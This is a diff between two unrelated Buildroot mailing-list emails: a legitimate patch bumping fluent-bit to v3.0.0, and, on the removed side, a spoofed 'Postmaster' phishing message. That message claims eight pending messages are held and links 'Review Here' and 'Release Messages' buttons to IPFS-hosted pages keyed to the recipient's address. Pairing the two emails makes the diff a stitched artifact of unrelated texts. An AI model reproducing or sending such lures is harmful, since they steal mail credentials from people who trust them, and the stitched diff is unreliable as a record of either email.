@@ -4,48 +4,77 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id DD47BC54E58
-	for <buildroot@archiver.kernel.org>; Sat, 23 Mar 2024 23:14:37 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 72AA9C54E58
+	for <buildroot@archiver.kernel.org>; Sat, 23 Mar 2024 23:21:27 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp4.osuosl.org (Postfix) with ESMTP id 1D3B940662;
-	Sat, 23 Mar 2024 23:14:37 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id F1F4D407FB;
+	Sat, 23 Mar 2024 23:21:26 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp4.osuosl.org ([127.0.0.1])
  by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id VHn0t6Vxj-o7; Sat, 23 Mar 2024 23:14:35 +0000 (UTC)
+ id 3TdiIqJto4aX; Sat, 23 Mar 2024 23:21:25 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 975ED40673
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 760CB4089E
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp4.osuosl.org (Postfix) with ESMTP id 975ED40673;
-	Sat, 23 Mar 2024 23:14:35 +0000 (UTC)
-Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
- by ash.osuosl.org (Postfix) with ESMTP id C76E01BF5A8
- for <buildroot@lists.busybox.net>; Sat, 23 Mar 2024 23:14:33 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id 760CB4089E;
+	Sat, 23 Mar 2024 23:21:25 +0000 (UTC)
+Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
+ by ash.osuosl.org (Postfix) with ESMTP id 895691BF5A8
+ for <buildroot@lists.busybox.net>; Sat, 23 Mar 2024 23:21:23 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp1.osuosl.org (Postfix) with ESMTP id B366A814C9
- for <buildroot@lists.busybox.net>; Sat, 23 Mar 2024 23:14:33 +0000 (UTC)
-X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp1.osuosl.org ([127.0.0.1])
- by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id UTFvNMtgjKle for <buildroot@lists.busybox.net>;
- Sat, 23 Mar 2024 23:14:33 +0000 (UTC)
-Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.132;
- helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 5CBD8814B7
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 5CBD8814B7
-Received: from busybox.net (unknown [141.98.10.132])
- by smtp1.osuosl.org (Postfix) with ESMTP id 5CBD8814B7
- for <buildroot@busybox.net>; Sat, 23 Mar 2024 23:14:32 +0000 (UTC)
-From: Postmaster <buildroot@busybox.net>
-To: buildroot@busybox.net
-Date: 24 Mar 2024 00:14:31 +0100
-Message-ID: <20240324001431.D0D2001CC8367990@busybox.net>
+ by smtp2.osuosl.org (Postfix) with ESMTP id 7D76A40373
+ for <buildroot@lists.busybox.net>; Sat, 23 Mar 2024 23:21:23 +0000 (UTC)
+X-Virus-Scanned: amavisd-new at osuosl.org
+Received: from smtp2.osuosl.org ([127.0.0.1])
+ by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id 5RX5UYWX3at4 for <buildroot@lists.busybox.net>;
+ Sat, 23 Mar 2024 23:21:22 +0000 (UTC)
+Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=209.85.128.47;
+ helo=mail-wm1-f47.google.com; envelope-from=thomas.devoogdt@gmail.com;
+ receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp2.osuosl.org 30C2A400FB
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 30C2A400FB
+Received: from mail-wm1-f47.google.com (mail-wm1-f47.google.com
+ [209.85.128.47])
+ by smtp2.osuosl.org (Postfix) with ESMTPS id 30C2A400FB
+ for <buildroot@buildroot.org>; Sat, 23 Mar 2024 23:21:21 +0000 (UTC)
+Received: by mail-wm1-f47.google.com with SMTP id
+ 5b1f17b1804b1-4147e135f4dso11245525e9.2
+ for <buildroot@buildroot.org>; Sat, 23 Mar 2024 16:21:21 -0700 (PDT)
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=1e100.net; s=20230601; t=1711236079; x=1711840879;
+ h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+ :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
+ :reply-to;
+ bh=6UY/oyenfnoU9g/b6snSjkvpJOV3iSMDci+BAUXJgqg=;
+ b=BPJtSFQmxLFK/95Fb7N7CK3/ZPAZ/t5QLi3V2R3twUnBseEV2vYQVquxMPd00ct96P
+ Hf9S+phUmY6GFLD5tQoq8Eo/6gXwTJotFcomULKC8TNOm7sCh/vEReTBgCmL1vCL5L0S
+ gmvdvMfDcVKXEdORncFMhYFsLqHnmwJhsbeES8JANXVn2al+xV67+nEf7Mb38NdMfZyg
+ Dt+fW8/oo8gNj+q7Ia88FNhGN+FUgbxfnBoPdg+hDkqMG35JKdsgUT1q7lyIdvPXLZCb
+ hn/3WfV2K8bQvMb8zwkQ+57xgBaYOTLigATzM8U96MmpMwFliTtiXJlggCtkFr+4jG3+
+ y1nQ==
+X-Gm-Message-State: AOJu0YxM+SZ3xyMiRb4sNCEg1GbFpTdsQeEMgNC3GwSkzRHv9Mzjq29h
+ 1HyMeh+sAy1RyXv1iNhxmFADOzCEFyPyqLtVMDiXGYW7tD3ni0bfnU5u7K8QR6c=
+X-Google-Smtp-Source: AGHT+IHueQBfBT/GauuYQTRcC5AHRvPq+dPGAN8ZE2nAhUm2yUptc9mKn+oKUk55UXWF9zuOHubP7Q==
+X-Received: by 2002:a05:600c:1551:b0:412:f81a:48c4 with SMTP id
+ f17-20020a05600c155100b00412f81a48c4mr2136114wmg.13.1711236079052; 
+ Sat, 23 Mar 2024 16:21:19 -0700 (PDT)
+Received: from localhost.localdomain
+ ([2a02:a03f:eb68:2f00:a3b6:f617:900f:8287])
+ by smtp.gmail.com with ESMTPSA id
+ h19-20020a05600c315300b004147c8dd13fsm3651491wmo.30.2024.03.23.16.21.18
+ (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+ Sat, 23 Mar 2024 16:21:18 -0700 (PDT)
+From: Thomas Devoogdt <thomas@devoogdt.com>
+To: buildroot@buildroot.org
+Date: Sun, 24 Mar 2024 00:21:16 +0100
+Message-Id: <20240323232116.3071446-1-thomas@devoogdt.com>
+X-Mailer: git-send-email 2.34.1
 MIME-Version: 1.0
-X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+X-Mailman-Original-Authentication-Results: smtp2.osuosl.org;
  dmarc=none (p=none dis=none)
- header.from=busybox.net
-Subject: [Buildroot] =?utf-8?q?Undeliverable=3A_You_have_=288=29_pending_?=
- =?utf-8?b?bWVzc8mRZ2Vz?=
+ header.from=devoogdt.com
+Subject: [Buildroot] [PATCH v1] package/fluent-bit: bump to v3.0.0
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -57,176 +86,102 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============8122669323793241904=="
+Cc: Thomas Devoogdt <thomas@devoogdt.com>
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
---===============8122669323793241904==
-Content-Type: text/html;
-	charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
+Release Notes:
+- https://fluentbit.io/announcements/v3.0.0/
 
-<html><head>
-<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
-<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
-</head>
-<body>
-<div id=3D":92b" style=3D'color: rgb(34, 34, 34); text-transform: none; tex=
-t-indent: 0px; letter-spacing: normal; font-family: "Google Sans", Roboto, =
-RobotoDraft, Helvetica, Arial, sans-serif; font-size: medium; font-style: n=
-ormal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2=
-; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
-normal; font-variant-caps: normal; text-decoration-style: initial; text-dec=
-oration-color: initial; -webkit-text-stroke-width:=20
-0px; text-decoration-thickness: initial;'><div class=3D"qQVYZb"><br></div><=
-div class=3D"lQs8Hd" jsaction=3D"SN3rtf:rcuQ6b" jscontroller=3D"i3Ohde"></d=
-iv><div class=3D"btm"></div></div>
-<div style=3D'color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
-x; letter-spacing: normal; font-family: "Google Sans", Roboto, RobotoDraft,=
- Helvetica, Arial, sans-serif; font-size: medium; font-style: normal; font-=
-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
- background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font=
--variant-caps: normal; text-decoration-style: initial; text-decoration-colo=
-r: initial; -webkit-text-stroke-width: 0px;=20
-text-decoration-thickness: initial;'><div class=3D"aHl" style=3D"margin-lef=
-t: -38px;"></div><div tabindex=3D"-1" id=3D":91y"></div>
-<div class=3D"ii gt" id=3D":929" style=3D"margin: 8px 0px 0px; padding: 0px=
-; font-size: 0.87rem; position: relative; direction: ltr;" jslog=3D"20277; =
-u014N:xr6bB; 1:WyIjdGhyZWFkLWY6MTc3ODU4Mjg5MTg5ODM1MTY4MSIsbnVsbCxudWxsLG51=
-bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsW11d; 4:WyI=
-jbXNnLWY6MTc3ODU4Mjg5MTg5ODM1MTY4MSIsbnVsbCxbXSxudWxsLG51bGwsbnVsbCxudWxsLG=
-51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxbXSxbXSxbXV0.">
-<div class=3D"a3s aiL " id=3D":92a" style=3D"font: small/1.5 Arial, Helveti=
-ca, sans-serif; width: 603px; height: 606px; overflow: hidden; font-size-ad=
-just: none; font-stretch: normal;"><u></u><div style=3D"margin: 0.4em;">
-<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
-e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
-f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
-; border-top-color: currentColor; border-top-width: 0px; border-top-style: =
-none; white-space: normal; box-sizing: border-box; background-color: rgb(24=
-4, 248, 245); font-variant-ligatures: normal; font-variant-caps: normal; te=
-xt-decoration-style: initial;=20
-text-decoration-color: initial;"><div style=3D"width: 593px; height: 43px; =
-padding-top: 5px; padding-right: 5px; padding-bottom: 5px; margin-left: 18p=
-x; border-top-color: currentColor; border-top-width: 0px; border-top-style:=
- none; float: left; box-sizing: border-box;"><span style=3D"box-sizing: bor=
-der-box;"><font size=3D"2"><span style=3D"box-sizing: border-box;"><font si=
-ze=3D"2">Message generated from<span>&nbsp;</span>
-<a style=3D"color: rgb(17, 85, 204);" href=3D"https://busybox.net" target=
-=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://m=
-edi-cont.hu&amp;source=3Dgmail&amp;ust=3D1696329870830000&amp;usg=3DAOvVaw0=
-fBxS8iT8to0LhSccEB9L8">busybox.net</a>&nbsp;source.</font></span><font size=
-=3D"2"></font><font size=3D"2"><span style=3D"box-sizing: border-box;"></sp=
-an></font></font><font size=3D"2"><span style=3D"box-sizing: border-box;">
-<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
-ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
-der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
-und-color: rgb(244, 248, 245);'><br></div></span></font></span><font size=
-=3D"2"></font><span style=3D"box-sizing: border-box;"></span>
-<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
-ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
-der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
-und-color: rgb(244, 248, 245);'><br></div></div><div style=3D"box-sizing: b=
-order-box;"><div style=3D"width: 5px; height: 30px; border-top-color: curre=
-ntColor; border-top-width: 0px; border-top-style: none; box-sizing: border-=
-box; background-color: rgb(86, 166, 89);"></div></div>
-</div><div style=3D"text-align: left; color: rgb(44, 54, 58); text-transfor=
-m: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto, san=
-s-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacin=
-g: 0px; white-space: normal; box-sizing: border-box; background-color: rgb(=
-255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
-text-decoration-style: initial; text-decoration-color: initial;"><br></div>=
+Also drop 0004-wasm-restore-support-for-some-targets-8401.patch,
+which was accepted upstream.
+(See: https://github.com/fluent/fluent-bit/commit/40bb0fbe17efa6b4b1a96940e9ff7374b1a0c3eb)
 
-<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
-e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
-f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
-; white-space: normal; box-sizing: border-box; background-color: rgb(255, 2=
-55, 255); font-variant-ligatures: normal; font-variant-caps: normal; text-d=
-ecoration-style: initial; text-decoration-color: initial;">&nbsp;</div>
-<table style=3D"width: 629px; text-align: left; color: rgb(44, 54, 58); tex=
-t-transform: none; letter-spacing: normal; font-family: calibri; font-size:=
- 16px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
-: normal; border-collapse: collapse; box-sizing: border-box; background-col=
-or: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: =
-normal; text-decoration-style: initial; text-decoration-color: initial;" bo=
-rder=3D"0"><tbody style=3D"box-sizing: border-box;">
-<tr style=3D"box-sizing: border-box;"><td align=3D"left" style=3D"margin: 0=
-px; box-sizing: border-box;"><table style=3D"width: 627px; border-collapse:=
- collapse; min-width: 600px; box-sizing: border-box;" border=3D"0" cellspac=
-ing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr al=
-ign=3D"center" style=3D"box-sizing: border-box;"><td style=3D"margin: 0px; =
-box-sizing: border-box;">
-<table style=3D"border-collapse: collapse; max-width: 600px; box-sizing: bo=
-rder-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D=
-"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=
-=3D"margin: 0px; box-sizing: border-box;"><table style=3D"width: 513px; bor=
-der-collapse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=
-=3D"0" cellpadding=3D"0"></table></td></tr><tr style=3D"box-sizing: border-=
-box;"><td style=3D"margin: 0px; box-sizing: border-box;">
-<div style=3D"padding: 22px 25.64px 30px; text-align: center; font-family: =
-Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 25px; border-top-c=
-olor: currentColor; border-bottom-color: rgb(201, 201, 201); border-top-wid=
-th: 0px; border-bottom-width: thin; border-top-style: none; border-bottom-s=
-tyle: solid; box-sizing: border-box;">Notification of pending&nbsp;8 messag=
-es.<br style=3D"box-sizing: border-box;"></div></td></tr><tr style=3D"box-s=
-izing: border-box;">
-<td style=3D"margin: 0px; box-sizing: border-box;"><div style=3D"border-top=
--color: currentColor; border-top-width: 0px; border-top-style: none; box-si=
-zing: border-box;">&nbsp;</div><div style=3D"box-sizing: border-box;">&nbsp=
-;</div><font size=3D"1"><font size=3D"2">Some messages are restrained from =
-delivering to <u><font color=3D"#0000ff"><a style=3D"color: rgb(17, 85, 204=
-);" href=3D"mailto:buildroot@busybox.net" target=3D"_blank">buildroot@busyb=
-ox.net</a></font></u><font style=3D"box-sizing: border-box;"><br><br></font=
-></font></font>
-<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
-<font size=3D"2">Due to low bandwidth we notify you to take prompt actions<=
-/font></p>
-<a style=3D"background: rgb(36, 107, 193); margin: 2px; padding: 10px; outl=
-ine: 0px; border: thick currentColor; border-image: none; color: rgb(255, 2=
-55, 255); text-decoration: none; float: left; display: block; box-sizing: b=
-order-box;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxfe=
-df4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@busybox.net" target=3D"_bl=
-ank" rel=3D"noreferrer"=20
-data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
-pfs.com/ipfs/QmZQvyxDWr4LkNi2rmTUucThARVM2DnAresq6upiC3z4Po?filename%3Dinde=
-x-update.html%23info@medi-cont.hu&amp;source=3Dgmail&amp;ust=3D169632987083=
-0000&amp;usg=3DAOvVaw0ibFTANhQzj-VXz7vNmqeY" data-saferedirectreason=3D"1">=
-<font size=3D"3">Release Messages</font></a>
-<a style=3D"background: rgb(179, 179, 179); margin: 2px; padding: 10px; out=
-line: 0px; border: thick currentColor; border-image: none; color: rgb(255, =
-255, 255); text-decoration: none; float: left; display: block; box-sizing: =
-border-box;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxf=
-edf4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@busybox.net" target=3D"_b=
-lank" rel=3D"noreferrer"=20
-data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
-pfs.com/ipfs/QmZQvyxDWr4LkNi2rmTUucThARVM2DnAresq6upiC3z4Po?filename%3Dinde=
-x-update.html%23info@medi-cont.hu&amp;source=3Dgmail&amp;ust=3D169632987083=
-0000&amp;usg=3DAOvVaw0ibFTANhQzj-VXz7vNmqeY" data-saferedirectreason=3D"1">=
-<font size=3D"3">Review Here</font></a><p style=3D"margin-top: 0px; margin-=
-bottom: 1rem; box-sizing: border-box;">&nbsp;</p><p style=3D"margin-top: 0p=
-x; margin-bottom: 1rem; box-sizing: border-box;"></p>
-<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
-&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: bor=
-der-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing:=
- border-box;"></p><h5 style=3D"line-height: 1.2; font-size: 1.25rem; font-w=
-eight: 500; margin-top: 0px; margin-bottom: 0.5rem; box-sizing: border-box;=
-"><font size=3D"1"><font size=3D"2"><font size=3D"3"><font size=3D"2">Messa=
-ge should be moved to inbox.&nbsp;<span>&nbsp;</span>
-<u style=3D"box-sizing: border-box;"><a href=3D"https://cloudflare-ipfs.com=
-/ipfs/QmNzHfbXaVaWHtrNL3UPmefnVoavavy1gvzmwSDzrWKWwA?filename=3DQmNzHfbXaVa=
-WHtrNL3UPmefnVoavavy1gvzmwSDzrWKWwA#buildroot@busybox.net">Mail.</a></u></f=
-ont></font></font></font></h5></td></tr></tbody></table></td></tr></tbody><=
-/table></td></tr></tbody></table></div></div></div></div></body></html>
+Signed-off-by: Thomas Devoogdt <thomas@devoogdt.com>
+---
+ ...estore-support-for-some-targets-8401.patch | 43 -------------------
+ package/fluent-bit/fluent-bit.hash            |  2 +-
+ package/fluent-bit/fluent-bit.mk              |  2 +-
+ 3 files changed, 2 insertions(+), 45 deletions(-)
+ delete mode 100644 package/fluent-bit/0004-wasm-restore-support-for-some-targets-8401.patch
 
---===============8122669323793241904==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
+diff --git a/package/fluent-bit/0004-wasm-restore-support-for-some-targets-8401.patch b/package/fluent-bit/0004-wasm-restore-support-for-some-targets-8401.patch
+deleted file mode 100644
+index ed6206268f..0000000000
+--- a/package/fluent-bit/0004-wasm-restore-support-for-some-targets-8401.patch
++++ /dev/null
+@@ -1,43 +0,0 @@
+-From 4a6c5f56cd1a979b91c168fb8e245587c2927aca Mon Sep 17 00:00:00 2001
+-From: Thomas Devoogdt <thomas@devoogdt.com>
+-Date: Mon, 22 Jan 2024 19:27:56 +0100
+-Subject: [PATCH] wasm: restore support for some targets (#8401)
+-
+-Somehow, support for ARC, MIPS, and XTENSA got dropped by bumping to v1.3.0,
+-so restore it now. Remark that those targets are mentioned in the section above.
+-
+-See commit fa6a248746f9f481b5f6aef49716141fa0222650.
+-
+-Upstream: https://github.com/fluent/fluent-bit/pull/8401
+-Signed-off-by: Thomas Devoogdt <thomas@devoogdt.com>
+----
+- src/wasm/CMakeLists.txt | 6 ++++++
+- 1 file changed, 6 insertions(+)
+-
+-diff --git a/src/wasm/CMakeLists.txt b/src/wasm/CMakeLists.txt
+-index a258dc063..4ea7eba65 100644
+---- a/src/wasm/CMakeLists.txt
+-+++ b/src/wasm/CMakeLists.txt
+-@@ -51,6 +51,10 @@ elseif (WAMR_BUILD_TARGET MATCHES "AARCH64.*")
+- elseif (WAMR_BUILD_TARGET MATCHES "ARM.*")
+-   add_definitions(-DBUILD_TARGET_ARM)
+-   add_definitions(-DBUILD_TARGET="${WAMR_BUILD_TARGET}")
+-+elseif (WAMR_BUILD_TARGET STREQUAL "MIPS")
+-+  add_definitions(-DBUILD_TARGET_MIPS)
+-+elseif (WAMR_BUILD_TARGET STREQUAL "XTENSA")
+-+  add_definitions(-DBUILD_TARGET_XTENSA)
+- elseif (WAMR_BUILD_TARGET STREQUAL "RISCV64" OR WAMR_BUILD_TARGET STREQUAL "RISCV64_LP64D")
+-   add_definitions(-DBUILD_TARGET_RISCV64_LP64D)
+- elseif (WAMR_BUILD_TARGET STREQUAL "RISCV64_LP64")
+-@@ -59,6 +63,8 @@ elseif (WAMR_BUILD_TARGET STREQUAL "RISCV32" OR WAMR_BUILD_TARGET STREQUAL "RISC
+-   add_definitions(-DBUILD_TARGET_RISCV32_ILP32D)
+- elseif (WAMR_BUILD_TARGET STREQUAL "RISCV32_ILP32")
+-   add_definitions(-DBUILD_TARGET_RISCV32_ILP32)
+-+elseif (WAMR_BUILD_TARGET STREQUAL "ARC")
+-+  add_definitions(-DBUILD_TARGET_ARC)
+- else ()
+-   message (FATAL_ERROR "-- Build target isn't set")
+- endif ()
+--- 
+-2.34.1
+-
+diff --git a/package/fluent-bit/fluent-bit.hash b/package/fluent-bit/fluent-bit.hash
+index 2c34583f7a..cc9c976d60 100644
+--- a/package/fluent-bit/fluent-bit.hash
++++ b/package/fluent-bit/fluent-bit.hash
+@@ -1,3 +1,3 @@
+ # Locally computed
+-sha256  8e7e951b2907e9d29508699c71c8949a4a22d750d54ffa5ee5b96537e59371dd  fluent-bit-2.2.2.tar.gz
++sha256  e70ae5be2f0ca1cb842a1c8d2762437907c522765f79b5c0c391eaa1b57c9f4c  fluent-bit-3.0.0.tar.gz
+ sha256  0d542e0c8804e39aa7f37eb00da5a762149dc682d7829451287e11b938e94594  LICENSE
+diff --git a/package/fluent-bit/fluent-bit.mk b/package/fluent-bit/fluent-bit.mk
+index 00a8904c55..33054bea66 100644
+--- a/package/fluent-bit/fluent-bit.mk
++++ b/package/fluent-bit/fluent-bit.mk
+@@ -4,7 +4,7 @@
+ #
+ ################################################################################
+ 
+-FLUENT_BIT_VERSION = 2.2.2
++FLUENT_BIT_VERSION = 3.0.0
+ FLUENT_BIT_SITE = $(call github,fluent,fluent-bit,v$(FLUENT_BIT_VERSION))
+ FLUENT_BIT_LICENSE = Apache-2.0
+ FLUENT_BIT_LICENSE_FILES = LICENSE
+-- 
+2.34.1
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
-
---===============8122669323793241904==--
